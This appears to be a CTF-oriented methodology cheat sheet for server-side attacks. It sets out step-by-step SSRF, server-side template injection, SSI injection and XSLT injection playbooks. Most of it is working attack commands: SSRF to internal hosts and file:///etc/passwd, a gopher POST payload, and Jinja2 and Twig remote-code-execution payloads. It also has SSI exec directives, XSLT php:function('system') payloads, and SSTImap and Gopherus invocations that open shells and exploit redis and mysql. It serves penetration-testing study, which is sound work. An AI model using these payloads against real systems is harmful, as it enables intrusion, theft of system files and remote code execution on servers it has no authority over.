# Server-Side Attacks Methodology

**Core principle:** The server executes code or makes requests on your behalf. Identify what the server processes from user input, confirm the vulnerability, then escalate to RCE.

---

## Attack Type Quick Reference

| Attack | Trigger | Goal |
|--------|---------|------|
| SSRF | Server fetches a URL from user input | Reach internal network, read files, interact with internal services |
| SSTI | User input inserted into a template string before rendering | Info disclosure → LFI → RCE |
| SSI Injection | User input written into a `.shtml` file the web server serves | RCE via `exec` directive |
| XSLT Injection | User input inserted into XSL data before XSLT processor runs | Info disclosure → LFI → RCE |

---

## SSRF

### Phase 1 — Confirm SSRF
```bash
# Set up listener
nc -lnvp 8000

# Point the parameter at yourself
dateserver=http://<YOUR_IP>:8000/test
# Callback received → SSRF confirmed

# Check if non-blind (response reflected back)
dateserver=http://127.0.0.1/index.php
# HTML in response → non-blind SSRF
```

### Phase 2 — Internal Port Scan
```bash
seq 1 10000 > ports.txt

# Identify what the closed-port error says first, then filter it
ffuf -w ./ports.txt \
  -u http://<TARGET>/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "vulnerable_param=http://127.0.0.1:FUZZ/&other=value" \
  -fr "Failed to connect to"
```

### Phase 3 — Enumerate Internal Endpoints
```bash
# Check what 404/403 looks like first
curl -s -X POST http://<TARGET>/index.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "vulnerable_param=http://internal.host/nonexistent.php"

# Fuzz directories — filter the Apache error string
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -u http://<TARGET>/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "vulnerable_param=http://internal.host/FUZZ.php" \
  -fr "Server at internal.host Port 80"
```

### Phase 4 — Access Internal Endpoint
```bash
curl -s -X POST http://<TARGET>/index.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "vulnerable_param=http://internal.host/admin.php"
```

### Phase 5 — LFI via file://
```bash
curl -s -X POST http://<TARGET>/index.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "vulnerable_param=file:///etc/passwd"
```

### Phase 6 — POST Request via gopher://
```
# Build raw HTTP POST, URL-encode spaces (%20) and newlines (%0D%0A)
# Prefix with gopher://host:port/_
gopher://internal.host:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20internal.host%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin

# When sending inside a POST parameter: URL-encode the entire gopher URL a SECOND time
```

### Phase 7 — Gopher to Other Services (Gopherus)
```bash
python2.7 gopherus.py --exploit smtp
python2.7 gopherus.py --exploit mysql
python2.7 gopherus.py --exploit redis
# Also: postgresql, fastcgi, zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

### Blind SSRF Notes
- Response not reflected — no direct data exfiltration
- Port scan still works if error message differs between open/closed ports
- File enumeration still works if error message differs for existing/missing files
- Non-HTTP services may both return the same error — indistinguishable in blind context

---

## SSTI

### Phase 1 — Identify Template Engine
```bash
# Always use -G --data-urlencode — raw URL encoding mangles { and }

# Step 1
curl -s -G "http://<TARGET>/" --data-urlencode "param=\${7*7}"
# Executed → Freemarker/other; Not executed → step 2

# Step 2
curl -s -G "http://<TARGET>/" --data-urlencode "param={{7*7}}"
# Not executed → other engine; Executed (49) → step 3

# Step 3 — Jinja2 vs Twig
curl -s -G "http://<TARGET>/" --data-urlencode "param={{7*'7'}}"
# 7777777 → Jinja2 (Python/Flask)
# 49      → Twig (PHP)
```

### Phase 2 — Jinja2 Exploitation
```bash
# Info disclosure — config dump (may contain secret keys)
curl -s -G "http://<TARGET>/" --data-urlencode "param={{ config.items() }}"

# Dump builtins
curl -s -G "http://<TARGET>/" --data-urlencode "param={{ self.__init__.__globals__.__builtins__ }}"

# LFI
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param={{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}"

# RCE — find flag
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param={{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name flag* 2>/dev/null').read() }}"

# RCE — read flag
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}"
```

### Phase 3 — Twig Exploitation
```bash
# Info disclosure
curl -s -G "http://<TARGET>/" --data-urlencode "param={{ _self }}"

# LFI — Symfony only (fall back to RCE if unavailable)
curl -s -G "http://<TARGET>/" --data-urlencode "param={{ '/etc/passwd'|file_excerpt(1,-1) }}"

# RCE — find flag
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param={{ ['find / -name flag* 2>/dev/null'] | filter('system') }}"

# RCE — read flag
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param={{ ['cat /flag.txt'] | filter('system') }}"
```

### Phase 4 — SSTImap (automated)
```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap && pip3 install -r requirements.txt

python3 sstimap.py -u "http://<TARGET>/?param=test"           # detect
python3 sstimap.py -u "http://<TARGET>/?param=test" -S id     # run command
python3 sstimap.py -u "http://<TARGET>/?param=test" -D '/etc/passwd' './passwd'  # download file
python3 sstimap.py -u "http://<TARGET>/?param=test" --os-shell  # interactive shell
```

---

## SSI Injection

### Key Concept — Two-Step Process
SSI executes when the `.shtml` file is **served**, not when input is submitted. Always:
1. Submit payload to write it into the `.shtml` file
2. Fetch the `.shtml` page separately to trigger execution and see output

### SSI Directives Reference
```
<!--#printenv -->                        # print all environment variables
<!--#echo var="DOCUMENT_NAME" -->        # print specific variable
<!--#exec cmd="whoami" -->               # execute OS command — path to RCE
<!--#include virtual="index.html" -->    # include file from web root
<!--#config errmsg="Error!" -->          # change SSI config
```

### Playbook
```bash
# Step 1: confirm — inject printenv
curl -s -G "http://<TARGET>/index.php" \
  --data-urlencode 'param=<!--#printenv -->'
curl -s "http://<TARGET>/page.shtml"
# Environment variables in response → SSI injection confirmed

# Step 2: find the flag
curl -s -G "http://<TARGET>/index.php" \
  --data-urlencode 'param=<!--#exec cmd="find / -name flag* 2>/dev/null" -->'
curl -s "http://<TARGET>/page.shtml"

# Step 3: read the flag
curl -s -G "http://<TARGET>/index.php" \
  --data-urlencode 'param=<!--#exec cmd="cat /flag.txt" -->'
curl -s "http://<TARGET>/page.shtml"
```

---

## XSLT Injection

### Phase 1 — Confirm and Fingerprint
```bash
# Trigger error with broken XML
curl -s -G "http://<TARGET>/" --data-urlencode "param=<"
# 500 error → possible XSLT injection

# Info disclosure — confirms injection and reveals processor version/vendor
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param=Version: <xsl:value-of select=\"system-property('xsl:version')\" />
Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" />
Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" />"
# Output printed → XSLT injection confirmed
```

### Phase 2 — LFI
```bash
# Requires PHP functions enabled in XSLT processor
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param=<xsl:value-of select=\"php:function('file_get_contents','/etc/passwd')\" />"

# XSLT 2.0+ only (check version first)
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param=<xsl:value-of select=\"unparsed-text('/etc/passwd', 'utf-8')\" />"
```

### Phase 3 — RCE
```bash
# Requires PHP functions enabled
# Find flag
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param=<xsl:value-of select=\"php:function('system','find / -name flag* 2>/dev/null')\" />"

# Read flag
curl -s -G "http://<TARGET>/" \
  --data-urlencode "param=<xsl:value-of select=\"php:function('system','cat /flag.txt')\" />"
```

---

## Decision Flow

```
What does the parameter do?
  ├─ Fetches a URL → SSRF
  │    ├─ Response reflected? → Non-blind → pull internal pages, files, use gopher
  │    └─ Response not reflected? → Blind → port scan + file enum only
  │
  ├─ Reflected in a page (name, search, etc.) → test for SSTI or XSLT
  │    ├─ Inject ${7*7} / {{7*7}} → math executes? → SSTI
  │    │    ├─ {{7*'7'}} = 7777777 → Jinja2
  │    │    └─ {{7*'7'}} = 49 → Twig
  │    └─ Inject < → 500 error, inject xsl:value-of → executes? → XSLT
  │
  └─ Written to a file served by web server → SSI
       └─ .shtml extension or SSI-enabled server → test <!--#printenv -->
```

---

## Universal Rules

1. **Always use `-G --data-urlencode`** — raw URL encoding mangles `{`, `}`, `<`, `>`
2. **Read the form HTML first** — check GET vs POST, action URL, parameter name
3. **Confirm before exploiting** — verify the vulnerability exists before escalating
4. **Find flag path before reading** — `find / -name flag* 2>/dev/null` first, then `cat`
5. **LFI is cleaner than RCE** — prefer `open().read()` or `file_get_contents()` when file path is known
6. **SSI is always two steps** — submit then fetch `.shtml`
7. **SSRF filter string matters** — identify exact closed-port/missing-file error before running ffuf
8. **gopher requires double URL-encoding** — encode the payload once, then encode the entire gopher URL again when it's inside a POST parameter
